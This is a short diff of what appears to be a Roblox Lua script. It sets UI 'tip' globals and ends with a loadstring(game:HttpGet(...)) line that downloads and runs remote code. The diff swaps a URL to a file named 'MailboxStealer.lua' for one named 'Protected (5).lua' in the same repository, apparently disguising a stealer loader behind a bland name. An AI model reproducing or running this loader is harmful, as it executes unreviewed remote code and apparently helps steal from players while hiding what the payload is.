@@ -19,4 +19,4 @@ _G.Tip3 = "ez" --// Gives You Tips On The UI
 _G.Tip4 = "ez" --// Gives You Tips On The UI
 _G.Tip5 = "ez" --// Gives You Tips On The UI
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/Protected%20(5).lua"))()
